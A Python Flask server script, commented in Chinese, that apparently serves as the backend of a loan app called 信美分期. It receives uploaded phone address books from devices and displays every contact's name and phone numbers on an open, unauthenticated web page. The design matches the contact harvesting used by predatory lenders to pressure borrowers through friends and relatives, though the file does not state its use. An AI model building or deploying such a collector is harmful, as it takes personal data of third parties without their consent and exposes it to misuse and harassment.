"""信美分期 — 通讯录接收服务器

启动方式：
    pip install flask
    python server.py

手机端上传地址：http://<本机IP>:8080/upload
查看数据：浏览器打开 http://localhost:8080
"""

import json
import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)
records = []  # 所有上传记录

HTML = """<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>信美分期 — 通讯录数据</title>
<style>
  body { font-family: -apple-system, system-ui, sans-serif; margin: 20px; background: #f5f5f5; }
  h1 { color: #DE2910; }
  .record { background: white; border-radius: 8px; padding: 16px; margin: 12px 0; box-shadow: 0 1px 3px rgba(0,0,0,.1); }
  .record h3 { margin: 0 0 8px 0; color: #333; }
  .record .meta { color: #888; font-size: 13px; margin-bottom: 12px; }
  table { width: 100%; border-collapse: collapse; font-size: 14px; }
  th, td { padding: 8px 10px; text-align: left; border-bottom: 1px solid #eee; }
  th { background: #DE2910; color: white; }
  tr:hover { background: #fafafa; }
  .empty { text-align: center; color: #999; padding: 60px 0; }
  .count { background: #DE2910; color: white; border-radius: 20px; padding: 2px 10px; font-size: 13px; }
</style>
</head>
<body>
<h1>信美分期 — 通讯录数据</h1>
<p>共 {{ records|length }} 条上传记录</p>
{% for r in records|reverse %}
<div class="record">
  <h3>{{ r.uploader }} 上传 <span class="count">{{ r.contacts|length }}人</span></h3>
  <div class="meta">
    设备：{{ r.deviceName }} &nbsp;|&nbsp;
    时间：{{ r.timestamp }} &nbsp;|&nbsp;
    服务器接收：{{ r.server_time }}
  </div>
  <table>
    <tr><th>姓名</th><th>电话</th><th>姓</th><th>名</th></tr>
    {% for c in r.contacts %}
    <tr>
      <td>{{ c.displayName }}</td>
      <td>{{ c.phones|join(', ') }}</td>
      <td>{{ c.familyName }}</td>
      <td>{{ c.givenName }}</td>
    </tr>
    {% endfor %}
  </table>
</div>
{% else %}
<div class="empty">暂无数据，等待手机上传……</div>
{% endfor %}
</body>
</html>"""


@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json(force=True)
    data["server_time"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    records.append(data)
    print(f"[收到] {data.get('uploader')} — {data.get('deviceName')} — {len(data.get('contacts', []))}个联系人")
    return {"ok": True, "count": len(records)}


@app.route("/")
def index():
    return render_template_string(HTML, records=records)


if __name__ == "__main__":
    print("=" * 50)
    print("  信美分期 — 通讯录接收服务器")
    print("  查看数据：http://localhost:8080")
    print("  上传接口：http://<本机IP>:8080/upload")
    print("=" * 50)
    app.run(host="0.0.0.0", port=8080, debug=False)
